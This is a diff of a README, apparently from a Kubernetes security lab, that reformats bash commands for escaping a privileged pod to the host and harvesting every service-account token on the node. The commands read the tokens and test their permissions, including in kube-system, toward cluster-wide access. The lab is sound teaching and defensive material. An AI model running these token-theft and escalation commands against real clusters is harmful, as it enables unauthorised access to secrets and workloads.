@@ -177,19 +177,40 @@ You can access any secret mounted within any pod on the node you are on. In a pr
 
 Look for tokens that have permissions to get secrets in kube-system. The examples below automate this process for you a bit:
 
-**Run kubectl can-i --list against ALL tokens found on the node**
+**Simply list the namespace and location of every token**
+```bash
+kubectl exec -it everything-allowed-exec-pod -- chroot /host bash
+tokens=`find /var/lib/kubelet/pods/ -name token -type l`; \
+for token in $tokens; \
+do parent_dir="$(dirname "$token")"; \
+namespace=`cat $parent_dir/namespace`; \
+echo $namespace "|" $token ; \
+done | sort
 ```
-tokens=`kubectl exec -it everything-allowed-exec-pod -- chroot /host find /var/lib/kubelet/pods/ -name token -type l`; for filename in $tokens; do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; echo "Token Location: $filename_clean"; tokena=`kubectl exec -it everything-allowed-exec-pod -- chroot /host cat $filename_clean`; echo -n "What can I do? "; kubectl --token=$tokena auth can-i --list; echo; done
+
+**Run kubectl can-i --list against ALL tokens found on the node**
+Run this where you have kubectl installed
+```
+tokens=`kubectl exec -it everything-allowed-exec-pod -- chroot /host find /var/lib/kubelet/pods/ -name token -type l`; \
+for filename in $tokens; \
+do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; \
+echo "Token Location: $filename_clean"; \
+tokena=`kubectl exec -it everything-allowed-exec-pod -- chroot /host cat $filename_clean`; \
+echo -n "What can I do? "; \
+kubectl --token=$tokena auth can-i --list; echo; \
+done
 ```
 
 **Run kubectl can-i --list -n kube-system against ALL tokens found on the node**
 ```
-tokens=`kubectl exec -it everything-allowed-exec-pod -- chroot /host find /var/lib/kubelet/pods/ -name token -type l`; for filename in $tokens; do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; echo "Token Location: $filename_clean"; tokena=`kubectl exec -it everything-allowed-exec-pod -- chroot /host cat $filename_clean`; echo -n "What can I do? "; kubectl --token=$tokena auth can-i --list -n kube-system; echo; done
-```
-
-**Just list the namespace and location of every token**
-```bash
-tokens=`find /var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort
+tokens=`kubectl exec -it everything-allowed-exec-pod -- chroot /host find /var/lib/kubelet/pods/ -name token -type l`; \
+for filename in $tokens; \
+do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; \
+echo "Token Location: $filename_clean"; \
+tokena=`kubectl exec -it everything-allowed-exec-pod -- chroot /host cat $filename_clean`; \
+echo -n "What can I do? "; \
+kubectl --token=$tokena auth can-i --list -n kube-system; echo; \
+done
 ```
 
 **Can any of the tokens:**
@@ -198,7 +219,7 @@ tokens=`find /var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; 
 * View secrets in the kube-system namespace?
 * Create clusterrolebindings? 
 
-Your goal is to find a way to get access to all resources in all namspaces.
+You are looking for a way to access to all resources in all namspaces.
 
 
 ## Some other ideas:
@@ -207,12 +228,14 @@ Your goal is to find a way to get access to all resources in all namspaces.
 * Look at the volumes that each of the pods have mounted. You might find some pretty sensitive stuff in there. 
 
 ## Attacks that apply to all pods, even without any special permissions
+
+**To see these in more detail, head over to [nothing-allowed/README.md](../nothing-allowed)** 
+
 * Cloud metadata service
 * `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
 * Kubernetes exploits
 * Hunting for vulnerable application/services in the cluster
 
-To see these in more detail, head over to [nothing-allowed/README.md](../nothing-allowed) 
 
 # Demonstrate impact
 
